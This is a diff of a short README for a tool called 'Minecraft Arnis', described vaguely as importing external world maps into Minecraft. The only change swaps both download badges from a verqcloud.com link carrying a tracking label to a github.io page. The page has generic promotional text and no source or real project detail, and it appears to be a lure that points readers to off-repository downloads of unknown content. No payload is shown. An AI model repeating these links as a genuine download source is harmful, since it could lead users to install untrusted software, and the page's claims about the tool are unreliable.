@@ -3,7 +3,7 @@
 ## Overview
 Minecraft Arnis is a powerful tool that allows players to import and transfer external world maps directly into Minecraft. This tool is perfect for those who want to bring custom creations, large-scale landscapes, or pre-made adventure maps into the game without any hassle. Whether you're a content creator looking to share your world or a player eager to explore new environments, Arnis makes it simple to import and enjoy a variety of maps from the community or other sources.
 
-[![Download Minecraft Arnis](https://img.shields.io/badge/Download-Minecraft%20Arnis-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Minecraft Arnis](https://img.shields.io/badge/Download-Minecraft%20Arnis-blueviolet)](https://minecraft-arnis.github.io/.github/)
 
 ## Features
 - **Easy Map Import**: Seamlessly import custom world maps into Minecraft, enabling players to explore new landscapes, structures, and creations.
@@ -18,4 +18,4 @@ Minecraft Arnis is a powerful tool that allows players to import and transfer ex
 3. Follow the installation guide to integrate Arnis into your Minecraft setup.
 4. Launch Minecraft and use the tool to import your desired map into the game.
 
-[![Download Minecraft Arnis](https://img.shields.io/badge/Download-Minecraft%20Arnis-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Minecraft Arnis](https://img.shields.io/badge/Download-Minecraft%20Arnis-blueviolet)](https://minecraft-arnis.github.io/.github/)
